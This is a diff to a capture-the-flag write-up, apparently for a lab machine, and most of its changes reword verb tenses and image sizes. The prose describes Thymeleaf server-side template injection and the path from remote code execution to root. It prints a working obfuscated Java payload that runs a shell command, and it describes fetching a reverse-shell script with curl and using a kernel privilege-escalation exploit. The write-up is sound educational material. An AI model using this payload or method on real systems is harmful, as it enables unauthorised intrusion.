@@ -17,13 +17,13 @@ It was a database of panda images with search functionality. Connecting to it wi
 <img src="Images/Image2.png" alt="Image2" width="75%"/>
 
 However, passing in *{7 * 7} and #{7 * 7} yielded 49.
-Since Thymeleaf runs java, you can pass in expressions using objects like *{T(java.lang.Runtime)} to execute java commands. To run bash commands, we can use a specific tool to parse commands in such a way that they are executed on their machine, at https://github.com/adeiarias/Java-SSTI-generator. For example, if I want to run whoami, I would have to turn it into a java SSTI payload first and then pass it into the search query.
+Since Thymeleaf runs java, you can pass in expressions using objects like *{T(java.lang.Runtime)} to execute java commands. To run bash commands, I used a tool to parse commands in such a way that they are executed on their machine, found at https://github.com/adeiarias/Java-SSTI-generator. For example, if I wanted to run whoami, I would have had to turn it into a java SSTI payload first and then pass it into the search query.
 
 ```bash
 whoami --> *{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(119).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(105))).getInputStream())}
 ```
 
-Now that I have RCE, I can try getting a remote shell. For some reason, oneline reverse shell commands aren't working, so I download a bash script on their machine instead using a local python server and curl to get a reverse shell.
+Now that I had RCE, I tried getting a remote shell. For some reason, oneline reverse shell commands weren't working, so I downloaded a bash script on their machine instead using a local python server and curl in order to get a reverse shell.
 
 ```bash
 #My Machine, in a directory with the payload
@@ -46,7 +46,8 @@ With that, I got a reverse shell and grabbed the user flag.
 
 Afterwards, I ran linpeas on the box by downloading the script from my local server and found that the Ubuntu version was vulnerable to CVE-2022-2588. I got the following exploit onto the box with the same method: https://github.com/Markakd/CVE-2022-2588.
 
-Running the exploit made a new user with root privledges that I could use to grab the root flag and pwned the box!
+Running the exploit made a new user with root privledges that I could use to grab the root flag and pwn the box!
 
-<img src="Images/Image4.png" alt="Image4" width="75%"/><img src="Images/Image5.png" alt="Image5" width="50%"/>
+<img src="Images/Image4.png" alt="Image4" width="75%"/>
+<img src="Images/Image5.png" alt="Image5" width="65%"/>
 <img src="Images/Image6.png" alt="Image6" width="75%"/>
